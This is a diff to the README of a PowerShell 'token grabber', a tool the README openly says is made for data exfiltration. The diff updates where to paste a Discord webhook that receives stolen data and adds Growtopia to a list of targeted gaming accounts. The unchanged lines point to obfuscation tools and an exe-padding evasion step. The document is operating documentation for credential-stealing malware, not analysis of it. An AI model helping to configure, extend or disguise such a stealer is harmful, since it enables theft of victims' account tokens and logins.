@@ -30,7 +30,7 @@ This tool is made for data exfiltration. All information collected is sent using
 - After creating a server go to ```Edit channel``` > ```Integrations``` > ```Webhooks``` > ```Create Webhook```
 - Copy the ```Webhook URL```
 - Download ```main.ps1``` 
-- Open ```main.ps1``` and replace ```YOUR_WEBHOOK_HERE``` in line ```827``` with your webhook or use the [builder](https://github.com/KDot227/Powershell-Token-Grabber/blob/main/builder.ps1).
+- Open ```main.ps1``` and replace ```YOUR_WEBHOOK_HERE``` in line ```837``` with your webhook or use the [builder](https://github.com/KDot227/Powershell-Token-Grabber/blob/main/builder.ps1).
 
 # Want to obfuscate the code ?
 Use [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation). \
@@ -44,7 +44,8 @@ Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat file
  - [x] 💉 Pump/Inject the output exe file with zero-filled bytes 
 
  ## 🔷 Webhook Data
-> ![screenshot](https://github.com/Chainski/PowerShell-Token-Grabber/assets/96607632/93c10b55-5a48-4851-a452-dabec704ae7e)
+> ![screenshot](https://github.com/Chainski/PowerShell-Token-Grabber/assets/96607632/7830653b-1fbb-46e6-8c49-26883a3eb34f)
+
 
 
 > ![data](https://github.com/Chainski/PowerShell-Token-Grabber/assets/96607632/630ba5ab-09e4-4427-826a-f5461623cd54)
@@ -70,6 +71,7 @@ Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat file
   > ### Gaming 
     - [Electronic Arts](https://ea.com)
     - [Epicgames](https://store.epicgames.com)
+    - [Growtopia](https://growtopiagame.com)
     - [Minecraft](https://minecraft.net)
     - [Ubisoft](https://ubisoftconnect.com)
     - [Steam](https://store.steampowered.com)
